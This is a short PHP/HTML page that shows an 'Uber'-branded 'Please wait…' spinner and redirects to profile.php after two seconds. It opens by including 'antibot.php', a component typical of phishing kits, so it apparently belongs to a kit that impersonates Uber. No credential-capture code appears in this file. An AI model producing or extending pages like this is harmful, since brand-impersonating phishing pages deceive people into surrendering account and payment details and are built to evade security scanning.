<?php
require "antibot.php";
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
<meta http-equiv="refresh" content="2;url=profile.php"/>
<title>Loading…</title>
<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
<style>
  :root{
    --bg:#fff; --text:#111; --black:#000;
  }
  *{box-sizing:border-box}
  body{margin:0;font-family:Inter,-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,"Helvetica Neue",Arial,sans-serif;background:var(--bg);color:var(--text);display:flex;flex-direction:column;height:100vh}
  header{background:var(--black);height:50px;padding:0 16px;display:flex;align-items:center;color:#fff;font-weight:700;font-size:16px}
  main{flex:1;display:flex;flex-direction:column;align-items:center;justify-content:center;text-align:center;padding:16px}
  .spinner{
    width:48px;height:48px;
    border:4px solid #e5e7eb;
    border-top-color:#111;
    border-radius:50%;
    animation:spin 1s linear infinite;
    margin-bottom:20px;
  }
  @keyframes spin{to{transform:rotate(360deg)}}
  .msg{font-size:16px;font-weight:600;color:#444}
</style>
</head>
<body>
  <header>Uber</header>
  <main>
    <div class="spinner" role="status" aria-label="Loading"></div>
    <div class="msg">Please wait…</div>
  </main>
</body>
</html>
